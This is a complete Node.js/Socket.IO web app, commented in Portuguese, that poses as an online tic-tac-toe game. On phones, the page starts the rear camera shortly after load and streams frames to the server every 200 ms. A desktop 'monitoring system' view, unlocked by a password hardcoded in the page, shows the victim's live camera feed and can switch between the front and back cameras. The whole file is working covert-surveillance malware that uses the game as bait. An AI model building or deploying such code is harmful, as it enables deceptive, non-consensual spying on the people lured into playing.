const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "171172";

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>🎮 Jogo da Velha Online</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #0f0f0f;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        
        /* Estilos para CELULAR - JOGO DA VELHA */
        .mobile-container {
            animation: fadeIn 1s;
            text-align: center;
            max-width: 500px;
            margin: 0 auto;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .game-title {
            font-size: 36px;
            color: #00ff00;
            margin-bottom: 20px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .play-button {
            background: transparent;
            color: #00ff00;
            border: 3px solid #00ff00;
            font-size: 32px;
            padding: 25px 60px;
            border-radius: 15px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin: 40px 0;
            transition: all 0.3s;
            animation: pulse 2s infinite;
        }
        
        .play-button:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 50px #00ff00;
        }
        
        /* Jogo da Velha */
        .game-screen {
            display: none;
        }
        
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 30px 0;
            aspect-ratio: 1/1;
        }
        
        .cell {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 64px;
            font-weight: bold;
            color: #00ff00;
            cursor: pointer;
            transition: all 0.3s;
            aspect-ratio: 1/1;
            text-shadow: 0 0 20px #00ff00;
        }
        
        .cell:hover {
            background: #2a2a2a;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .cell.winner {
            background: #00ff00;
            color: black;
            text-shadow: none;
        }
        
        .turn-indicator {
            background: #0f0f0f;
            padding: 15px;
            border-radius: 8px;
            color: #00ff00;
            font-size: 22px;
            font-weight: bold;
            margin: 20px 0;
            border: 1px solid #00ff00;
        }
        
        /* Estilos para PC */
        .pc-container {
            text-align: left;
            color: #00ff00;
        }
        
        .hacker-title {
            font-size: 36px;
            color: #00ff00;
            text-align: center;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 4px;
            text-shadow: 0 0 20px #00ff00;
        }
        
        .pc-layout {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        .camera-section, .game-section {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 20px;
        }
        
        .video-container {
            position: relative;
            width: 100%;
            background: #0a0a0a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
            margin-bottom: 15px;
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            background: #0a0a0a;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 10, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 8px;
        }
        
        .password-box {
            background: #0f0f0f;
            border: 2px solid #00ff00;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 300px;
        }
        
        .password-box input {
            width: 100%;
            padding: 15px;
            font-size: 24px;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        
        .password-box button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .password-box button:hover {
            background: #00ff00;
            color: black;
        }
        
        .camera-controls {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 15px;
        }
        
        .camera-btn {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .camera-btn:hover:not(:disabled) {
            background: #00ff00;
            color: black;
        }
        
        .camera-btn.active {
            background: #00ff00;
            color: black;
        }
        
        .camera-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .terminal-text {
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin-top: 20px;
            padding: 15px;
            background: #0a0a0a;
            border-left: 3px solid #00ff00;
        }
        
        .hidden {
            display: none !important;
        }
        
        #localVideo {
            display: none;
        }
        
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-dot.online {
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .status-dot.offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
        
        @media (max-width: 768px) {
            .pc-layout {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR -->
        <div id="mobileContent" class="mobile-container">
            <div class="game-title">🎮 JOGO DA VELHA</div>
            
            <div id="welcomeScreen" class="welcome-screen">
                <div class="game-subtitle">Desafie seu oponente online!</div>
                <button class="play-button" onclick="iniciarJogo()">▶ JOGAR</button>
                <div class="terminal-text">
                    <span class="status-dot" id="statusDot"></span> Status: <span id="statusText">Aguardando...</span>
                </div>
            </div>
            
            <div id="gameScreen" class="game-screen">
                <div class="turn-indicator" id="turnIndicator">SUA VEZ</div>
                <div class="board" id="board">
                    ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="fazerJogada(${i})"></div>`).join('')}
                </div>
                <div class="game-status" id="gameStatus">Aguardando oponente...</div>
                <button class="reset-button" onclick="reiniciarJogo()">🔄 NOVO JOGO</button>
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC -->
        <div id="pcContent" class="pc-container hidden">
            <div class="hacker-title">⚡ SISTEMA DE MONITORAMENTO ⚡</div>
            
            <div class="pc-layout">
                <div class="camera-section">
                    <div class="section-title">📹 CÂMERA REMOTA</div>
                    <div class="video-container">
                        <!-- Usando IMG em vez de VIDEO para dataURL -->
                        <img id="remoteVideo" style="width:100%; height:100%; object-fit:cover;">
                        
                        <div id="passwordOverlay">
                            <div class="password-box">
                                <h3>🔒 ACESSO RESTRITO</h3>
                                <input type="password" id="senhaInput" maxlength="6" placeholder="******">
                                <button onclick="verificarSenha()">AUTENTICAR</button>
                                <div id="erroSenha" style="color:#ff0000; margin-top:10px; display:none;">Acesso negado!</div>
                            </div>
                        </div>
                    </div>
                    
                    <div id="cameraControls" class="camera-controls hidden">
                        <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')" disabled>FRONTAL</button>
                        <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')" disabled>TRASEIRA</button>
                    </div>
                    
                    <div class="terminal-text" id="cameraTerminal">
                        > Aguardando autenticação...
                    </div>
                </div>
                
                <div class="game-section">
                    <div class="section-title">🎮 JOGO DA VELHA</div>
                    
                    <div class="turn-indicator" id="pcTurnIndicator">AGUARDANDO...</div>
                    <div class="board" id="pcBoard">
                        ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="pcFazerJogada(${i})"></div>`).join('')}
                    </div>
                    <div class="game-status" id="pcGameStatus">
                        <span class="status-dot offline"></span> Aguardando jogador...
                    </div>
                    <button class="reset-button" onclick="pcReiniciarJogo()">🔄 NOVO JOGO</button>
                    <div class="terminal-text" id="pcTerminal"></div>
                </div>
            </div>
        </div>
        
        <video id="localVideo" autoplay playsinline muted style="display:none;"></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "171172";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const cameraControls = document.getElementById('cameraControls');
        const cameraTerminal = document.getElementById('cameraTerminal');
        
        // Estado
        let visualizacaoLiberada = false;
        let tentativas = 3;
        let mediaStream = null;
        let cameraAtual = 'back';
        let intervaloCaptura = null;
        
        // Estado do jogo
        let jogoAtivo = false;
        let vezDoJogador = true;
        let celulas = Array(9).fill('');
        
        // Detectar dispositivo
        const isMobile = /mobile|android|iphone|ipod/i.test(navigator.userAgent.toLowerCase());
        
        // Configurar interface
        if (isMobile) {
            console.log('📱 Modo celular');
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
            document.getElementById('statusDot').className = 'status-dot online';
            document.getElementById('statusText').innerHTML = 'Conectado';
            
            // Iniciar câmera após 1 segundo
            setTimeout(() => iniciarCamera('back'), 1000);
        } else {
            console.log('💻 Modo PC');
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
            socket.emit('pcConectado');
        }
        
        // ========== FUNÇÕES DA CÂMERA ==========
        async function iniciarCamera(tipo) {
            try {
                console.log('📷 Iniciando câmera:', tipo);
                
                if (intervaloCaptura) clearInterval(intervaloCaptura);
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: tipo === 'front' ? 'user' : 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                
                intervaloCaptura = setInterval(() => {
                    try {
                        if (localVideo.readyState === 4) {
                            ctx.drawImage(localVideo, 0, 0, 640, 480);
                            const frame = canvas.toDataURL('image/jpeg', 0.7);
                            socket.emit('frame', frame);
                        }
                    } catch (e) {
                        console.log('Erro captura:', e);
                    }
                }, 200);
                
                console.log('✅ Câmera ativa');
                
            } catch (err) {
                console.error('Erro câmera:', err);
                cameraTerminal.innerHTML = '> Erro: ' + err.message;
            }
        }
        
        window.mudarCamera = function(tipo) {
            if (!visualizacaoLiberada) return;
            cameraAtual = tipo;
            iniciarCamera(tipo);
            socket.emit('trocarCamera', tipo);
        };
        
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            
            if (senha === SENHA_CORRETA) {
                passwordOverlay.classList.add('hidden');
                visualizacaoLiberada = true;
                cameraControls.classList.remove('hidden');
                
                document.getElementById('cameraFrontBtn').disabled = false;
                document.getElementById('cameraBackBtn').disabled = false;
                document.getElementById('cameraBackBtn').classList.add('active');
                
                cameraTerminal.innerHTML = '> Acesso liberado! Transmissão ativa.';
            } else {
                tentativas--;
                document.getElementById('erroSenha').style.display = 'block';
                if (tentativas <= 0) {
                    document.getElementById('senhaInput').disabled = true;
                    document.querySelector('.password-box button').disabled = true;
                }
            }
        };
        
        // ========== FUNÇÕES DO JOGO (MOBILE) ==========
        window.iniciarJogo = function() {
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('gameScreen').style.display = 'block';
            socket.emit('jogadorPronto');
        };
        
        window.fazerJogada = function(index) {
            if (!jogoAtivo || !vezDoJogador || celulas[index] !== '') return;
            
            celulas[index] = 'X';
            document.querySelector(\`[data-index="\${index}"]\`).innerHTML = 'X';
            
            if (verificarVitoria('X')) {
                jogoAtivo = false;
                document.getElementById('gameStatus').innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogada', { index, vitoria: true });
                return;
            }
            
            if (!celulas.includes('')) {
                jogoAtivo = false;
                document.getElementById('gameStatus').innerHTML = '🤝 EMPATE!';
                socket.emit('jogada', { index, empate: true });
                return;
            }
            
            vezDoJogador = false;
            document.getElementById('turnIndicator').innerHTML = 'VEZ DO OPONENTE';
            socket.emit('jogada', { index });
        };
        
        function verificarVitoria(jogador) {
            const combinacoes = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
            return combinacoes.some(combo => combo.every(i => celulas[i] === jogador));
        }
        
        window.reiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            document.querySelectorAll('.cell').forEach(cell => cell.innerHTML = '');
            document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
            document.getElementById('gameStatus').innerHTML = 'Jogo reiniciado!';
            socket.emit('reiniciarJogo');
        };
        
        // ========== FUNÇÕES DO JOGO (PC) ==========
        window.pcFazerJogada = function(index) {
            if (!jogoAtivo || vezDoJogador || celulas[index] !== '') return;
            
            celulas[index] = 'O';
            document.querySelector(\`#pcBoard [data-index="\${index}"]\`).innerHTML = 'O';
            
            if (verificarVitoriaPC('O')) {
                jogoAtivo = false;
                document.getElementById('pcGameStatus').innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogadaPC', { index, vitoria: true });
                return;
            }
            
            if (!celulas.includes('')) {
                jogoAtivo = false;
                document.getElementById('pcGameStatus').innerHTML = '🤝 EMPATE!';
                socket.emit('jogadaPC', { index, empate: true });
                return;
            }
            
            vezDoJogador = true;
            document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
            socket.emit('jogadaPC', { index });
        };
        
        function verificarVitoriaPC(jogador) {
            const combinacoes = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
            return combinacoes.some(combo => combo.every(i => celulas[i] === jogador));
        }
        
        window.pcReiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            document.querySelectorAll('#pcBoard .cell').forEach(cell => cell.innerHTML = '');
            document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
            document.getElementById('pcGameStatus').innerHTML = 'Jogo reiniciado!';
            socket.emit('reiniciarJogo');
        };
        
        // ========== SOCKET ==========
        socket.on('connect', () => console.log('Conectado'));
        
        socket.on('jogoIniciado', () => {
            if (isMobile) {
                jogoAtivo = true;
                document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
                document.getElementById('gameStatus').innerHTML = 'Jogo iniciado!';
            } else {
                jogoAtivo = true;
                vezDoJogador = false;
                document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
                document.getElementById('pcGameStatus').innerHTML = '<span class="status-dot online"></span> Jogo iniciado!';
                document.getElementById('pcTerminal').innerHTML = '> Jogador mobile conectado';
            }
        });
        
        socket.on('jogadaRecebida', (data) => {
            if (isMobile) {
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'O';
                    document.querySelector(\`[data-index="\${data.index}"]\`).innerHTML = 'O';
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        document.getElementById('gameStatus').innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        document.getElementById('gameStatus').innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = true;
                        document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
                    }
                }
            } else {
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'X';
                    document.querySelector(\`#pcBoard [data-index="\${data.index}"]\`).innerHTML = 'X';
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        document.getElementById('pcGameStatus').innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        document.getElementById('pcGameStatus').innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = false;
                        document.getElementById('pcTurnIndicator').innerHTML = 'SUA VEZ';
                    }
                }
            }
        });
        
        socket.on('jogoReiniciado', () => {
            if (isMobile) reiniciarJogo();
            else pcReiniciarJogo();
        });
        
        socket.on('trocarCamera', (tipo) => {
            if (isMobile) iniciarCamera(tipo);
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada && remoteVideo) {
                remoteVideo.src = frameData;
            }
        });
        
        // Enter para enviar senha
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  let mobileId = null;
  
  socket.on('pcConectado', () => {
    console.log('PC conectado');
  });
  
  socket.on('jogadorPronto', () => {
    mobileId = socket.id;
    console.log('Jogador mobile pronto');
    io.emit('jogoIniciado');
  });
  
  socket.on('jogada', (data) => socket.broadcast.emit('jogadaRecebida', data));
  socket.on('jogadaPC', (data) => socket.broadcast.emit('jogadaRecebida', data));
  socket.on('reiniciarJogo', () => io.emit('jogoReiniciado'));
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('trocarCamera', (tipo) => {
    console.log('Trocar câmera:', tipo);
    socket.broadcast.emit('trocarCamera', tipo);
  });
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
    if (socket.id === mobileId) {
      io.emit('jogadorDesconectado');
    }
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(50));
  console.log('🎮 Servidor rodando na porta', PORT);
  console.log('🔑 Senha:', SENHA);
  console.log('='.repeat(50));
});
